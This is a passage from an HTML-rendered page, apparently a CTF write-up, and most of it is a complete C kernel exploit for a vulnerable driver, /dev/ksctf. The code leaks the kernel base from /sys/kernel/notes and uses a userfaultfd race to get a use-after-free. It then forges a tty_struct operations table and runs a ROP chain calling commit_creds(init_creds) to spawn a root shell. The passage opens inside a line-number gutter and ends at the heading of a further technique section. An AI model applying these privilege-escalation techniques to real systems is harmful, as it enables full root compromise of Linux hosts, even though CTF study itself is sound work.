class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xffffffff824493c0</span>;</span><br><span class="line"><span class="type">size_t</span> heap_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> work_for_cpu_fn = <span class="number">0xffffffff810bd960</span>;</span><br><span class="line"><span class="type">size_t</span> init_creds = <span class="number">0xffffffff82c6b920</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810ce710</span>;</span><br><span class="line"><span class="type">size_t</span> fake_ops_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> orignal[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">size_t</span> leak, kernel_base;</span><br><span class="line"><span class="type">size_t</span> gadget = <span class="number">0xffffffff817d1e76</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi;</span><br><span class="line"><span class="type">size_t</span> add_rsp_188_pop_rbx_ret;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00a74</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *msg;</span><br><span class="line">    <span class="type">uint64_t</span> a;</span><br><span class="line">    <span class="type">uint64_t</span> b;</span><br><span class="line">    <span class="type">uint64_t</span> c;</span><br><span class="line">    <span class="type">uint64_t</span> d;</span><br><span class="line">    <span class="type">uint64_t</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            heap_addr = *(<span class="type">size_t</span>*)vuln.e;</span><br><span class="line">            hexx(<span class="string">&quot;heap_addr&quot;</span>, heap_addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">sem_t</span> sem_write, sem_free;</span><br><span class="line"><span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">int</span> tty_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> uffd_buf[<span class="number">0x200</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span>* uffd_buf, <span class="type">pthread_t</span> pthread_moniter, <span class="type">void</span>* handler)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line"> </span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_NONBLOCK|O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) err_exit(<span class="string">&quot;syscall for userfaultfd ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_API ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)uffd_buf;</span><br><span class="line">    uffdio_register.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_REGISTER ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> res = pthread_create(&amp;pthread_moniter, <span class="literal">NULL</span>, handler, uffd);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) err_exit(<span class="string">&quot;pthread_create ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hijack_handler</span><span class="params">(<span class="type">void</span> *args)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd = (<span class="type">int</span>)args;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="keyword">if</span> (poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec poll for leak_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> res = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;EOF on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;ERROR on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            err_exit(<span class="string">&quot;INCORRET EVENT in leak_handler&quot;</span>);</span><br><span class="line">        <span class="comment">// operation</span></span><br><span class="line">        info(<span class="string">&quot;hijack the kernel in userfaultfd -- hijack_handler&quot;</span>);</span><br><span class="line">        del();</span><br><span class="line"></span><br><span class="line">        tty_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        uffd_buf[<span class="number">0</span>] = <span class="number">0x100005401</span>;</span><br><span class="line">        uffd_buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        uffd_buf[<span class="number">2</span>] = kernel_base + <span class="number">0x13e8030</span> - <span class="number">0x60</span>;</span><br><span class="line">        uffd_buf[<span class="number">3</span>] = fake_ops_addr + <span class="number">0x40</span>;</span><br><span class="line">        uffd_buf[<span class="number">4</span>] = commit_creds;</span><br><span class="line">        uffd_buf[<span class="number">5</span>] = init_creds;</span><br><span class="line">        uffd_buf[<span class="number">7</span>] = add_rsp_188_pop_rbx_ret;</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[0]&quot;</span>, uffd_buf[<span class="number">0</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[1]&quot;</span>, uffd_buf[<span class="number">1</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[2]&quot;</span>, uffd_buf[<span class="number">2</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[3]&quot;</span>, uffd_buf[<span class="number">3</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[4]&quot;</span>, uffd_buf[<span class="number">4</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[5]&quot;</span>, uffd_buf[<span class="number">5</span>]);</span><br><span class="line">        </span><br><span class="line">        uffdio_copy.src = uffd_buf;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = <span class="number">0x1000</span>;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec ioctl for UFFDIO_COPY in leak_handler&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_shell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* to exit the process normally, instead of segmentation fault */</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> get_root_func = (<span class="type">size_t</span>)get_root_shell;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ksctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> note_fd = open(<span class="string">&quot;/sys/kernel/notes&quot;</span>, O_RDONLY);</span><br><span class="line">    read(note_fd, data, <span class="number">0x100</span>);</span><br><span class="line">    binary_dump(<span class="string">&quot;/sys/kernel/notes&quot;</span>, data, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;leak, &amp;data[<span class="number">0x84</span>], <span class="number">8</span>);</span><br><span class="line">    hexx(<span class="string">&quot;leak&quot;</span>, leak);</span><br><span class="line">    kernel_base = leak - <span class="number">0x19e1180</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_base&quot;</span>, kernel_base);</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_offset&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line">    hexx(<span class="string">&quot;modprobe_path&quot;</span>, modprobe_path);</span><br><span class="line"></span><br><span class="line">    vuln.msg = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">memset</span>(vuln.msg, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x30</span>);</span><br><span class="line">    </span><br><span class="line">    work_for_cpu_fn  = kernel_base + <span class="number">0x8c360</span>;</span><br><span class="line">    init_creds = kernel_base + <span class="number">0x1448cc0</span>;</span><br><span class="line">    commit_creds = kernel_base + <span class="number">0x97d00</span>;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="number">35</span>;</span><br><span class="line">    hexx(<span class="string">&quot;commit_creds&quot;</span>, commit_creds);</span><br><span class="line">    hexx(<span class="string">&quot;work_for_cpu_fn&quot;</span>, work_for_cpu_fn);</span><br><span class="line">    hexx(<span class="string">&quot;swapgs_restore_regs_and_return_to_usermode&quot;</span>, swapgs_restore_regs_and_return_to_usermode);</span><br><span class="line"></span><br><span class="line">    pop_rdi = kernel_base + <span class="number">0xe031</span>;</span><br><span class="line">    add_rsp_188_pop_rbx_ret = kernel_base + <span class="number">0x9369cc</span>;</span><br><span class="line">    hexx(<span class="string">&quot;add_rsp_188_pop_rbx_ret&quot;</span>,add_rsp_188_pop_rbx_ret);</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line">    fake_ops_addr = heap_addr - <span class="number">0x68</span>;</span><br><span class="line">    hexx(<span class="string">&quot;fake_ops_addr&quot;</span>, fake_ops_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> pwn;</span><br><span class="line">    <span class="type">char</span> *uffd_buf_hijack = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfaultfd(uffd_buf_hijack, &amp;pwn, hijack_handler);</span><br><span class="line"></span><br><span class="line">    orignal[<span class="number">0</span>] = <span class="number">0x100005401</span>;</span><br><span class="line">    orignal[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    orignal[<span class="number">2</span>] = heap_addr - <span class="number">0x2a5540</span>;</span><br><span class="line">    orignal[<span class="number">3</span>] = kernel_base + <span class="number">0x1073e00</span>;</span><br><span class="line">    orignal[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    orignal[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">    orignal[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    write(fd,uffd_buf_hijack,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   pop_rdi;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   init_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   0;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   0;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   16;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   0xfffffe0000010f58;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   0xfffffe0000010f58;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   tty_fd;&quot;</span>        </span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    hexx(<span class="string">&quot;UID&quot;</span>, getuid());</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="notes-leak-userfaultfd-tty-struct-modprobe-path"><a href="#notes-leak-userfaultfd-tty-struct-modprobe-path" class="headerlink" title="notes leak + userfaultfd + tty_struct + modprobe_path"></a>notes leak + userfaultfd + tty_struct + modprobe_path</h2><h3 